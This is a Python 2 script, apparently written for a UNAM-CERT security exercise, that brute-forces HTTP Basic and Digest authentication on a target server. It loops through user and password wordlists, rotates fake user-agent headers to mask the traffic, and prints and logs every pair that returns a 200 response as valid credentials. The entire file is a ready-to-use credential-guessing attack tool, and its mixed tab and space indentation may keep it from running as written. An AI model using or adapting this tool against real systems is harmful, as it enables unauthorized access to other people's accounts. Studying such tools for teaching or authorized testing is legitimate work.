#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError
from requests.auth import HTTPDigestAuth
import random

def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    """
    Se agrega modo digest -d y se implementa el modo verboso -v
    """
    parser = optparse.OptionParser()
    parser.add_option('-d','--digest', dest='digest', default=None, action='store_true', help='Digest Auth')
    parser.add_option('-v','--verbose', dest='verbose', default=None, action='store_true', help='If specified, prints detailed information during execution.')
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-r','--report', dest='report', default=None, help='File where the results will be reported.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    parser.add_option('-y', '--fileu', dest='fileu', default=None, help='Passwords that will be tested during the attack.')
    parser.add_option('-F', '--filep', dest='filep', default=None, help='Passwords that will be tested during the attack.')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)


def reportResults():
    pass


def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url

def dRequest(host, user, password,head):
    digest=HTTPDigestAuth(user,password)
    try:
	response = get(host, auth=digest,headers=head)
	#print response
	#print dir(response)
        return response
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)



def makeRequest(host, user, password,head):
    try:
	response = get(host, auth=(user,password),headers=head)
	#print response
	#print dir(response)
        return response
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)


if __name__ == '__main__':
    heads=[{"user-agent":"anom1"},
            {'user-agent':'Anmo2'},
            {'user-agent':'anom3'},
            {'user-agent':'anom4'}]
    try:
        opts = addOptions()
        if opts.filep != None:
            passes = open(opts.filep,'r')
            lstPass = passes.readlines()
            passes.close()
        else:
            lstPass = []
        if opts.fileu != None:
            ussers = open(opts.fileu,'r')
	    lstUsr = ussers.readlines()
            ussers.close()
        else:
            lstUsr = []

        lstPass = map(lambda x: x[:-1],lstPass)
        lstUsr = map(lambda x: x[:-1],lstUsr)
        if opts.user != None:
            lstUsr.append(opts.user)
        if opts.password != None:
            lstPass.append(opts.password)
	checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        for passwdd in lstPass:
	    for usser in lstUsr:
                if opts.verbose:
                    print '\nUtilizando:\tUsuario:%s\tConstraseña: %s\nEn host:%s\tPuerto:%s' % (usser,passwdd,opts.server,opts.port)
                if opts.report:
                    reporte = open(opts.report,'a+')
                    reporte.write('\nUtilizando:\tUsuario:%s\tConstraseña: %s\nEn host:%s\tPuerto:%s' % (usser,passwdd,opts.server,opts.port))

                if opts.digest:
                    headd = random.choice(heads)
                    req = dRequest(url,usser,passwdd,headd)
                else:
                    headd = random.choice(heads)
                    req = makeRequest(url, usser, passwdd,headd)
                if req.status_code == 200:
                    print 'Credenciales validas: %s, %s'% (usser,passwdd)
                    if opts.report:
                        reporte = open(opts.report,'a+')
                        reporte.write('Credenciales validas: %s, %s'% (usser,passwdd)) 

    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
